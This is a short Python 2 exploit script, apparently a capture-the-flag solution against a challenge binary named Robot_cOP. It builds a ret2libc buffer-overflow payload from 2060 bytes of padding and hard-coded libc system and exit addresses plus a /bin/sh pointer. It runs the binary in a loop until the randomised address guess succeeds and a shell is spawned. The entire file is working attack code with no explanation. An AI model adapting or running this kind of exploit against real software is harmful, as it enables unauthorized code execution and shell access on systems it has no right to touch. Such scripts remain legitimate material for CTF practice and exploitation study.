#!/usr/bin/env python
# coding: utf-8

import struct
import subprocess

base = 0xf754e000           	   # base libc address's
system_offset = 0x0003e3e0  	   # system offset function
exit_offset = 0x000311b0    	   # exit offset function
binsh =  0x804825c          	   # /bin/sh  addresse's contained in the binary

system_addr = base + system_offset # final system address's
exit_addr = base + exit_offset     # final exit address's

payload = "A" * 2060
payload += struct.pack("<I",system_addr)
payload += struct.pack("<I",exit_addr)
payload += struct.pack("<I",binsh)

while (1):
    result = subprocess.call(["/challenges/robot_cop/Robot_cOP", payload])
    if not result:
        print "Done"
        exit(0)
    else:
        print "KO\n"
